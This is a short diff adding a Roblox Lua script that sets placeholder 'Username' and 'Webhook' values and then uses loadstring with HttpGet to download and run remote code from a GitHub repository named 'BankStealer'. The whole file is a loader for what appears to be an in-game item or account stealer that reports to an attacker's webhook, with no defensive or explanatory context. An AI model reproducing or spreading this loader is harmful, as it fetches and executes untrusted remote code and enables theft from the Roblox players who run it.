@@ -1,0 +1,4 @@
+Username = "Username"
+Webhook = "Webhook"
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Matou2903/BankStealer/main/V8-Scripter2.%5D0"))()
